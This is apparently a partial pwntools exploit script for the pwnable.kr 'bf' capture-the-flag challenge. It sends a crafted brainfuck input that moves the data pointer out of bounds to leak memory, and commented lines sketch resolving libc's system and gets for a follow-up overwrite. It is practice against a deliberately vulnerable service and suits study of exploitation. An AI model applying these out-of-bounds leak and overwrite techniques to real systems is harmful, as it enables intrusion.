from pwn import *
from pwnlib.util.packing import p32
# context(log_level="debug")
# context.update(arch="amd64", os="linux", bits=64)
# s =  ssh(host='pwnable.kr',
         # port=2222,
         # user='unlink',
         # password='guest'
        # )
p = remote('pwnable.kr', 9001)
# p = process("./bf")
p.recvuntil("type some brainfuck instructions except [ ]")
# stack = int(p.recv(10),16)
# print(stack)
# payload
# putchar read <*0x70 + .(\n') + .>*4

p.sendline('<'*0x8c+'.'+'.>'*32)
print(p.recv(1))
# offset_putchar = p.recv(4)
for i in range(8):
    print(hex(int.from_bytes(p.recv(4), "little")))

# libc = ELF('/home/koi/dumpster/pwncache/bf_libc.so')
# base = int.from_bytes(offset_putchar, "little") - libc.symbols['putchar']
# entry = 0x080484e0
# system = base + libc.symbols['system']
# gets = base + libc.symbols['gets']

# print(hex(system))
# print(hex(gets))
p.close()
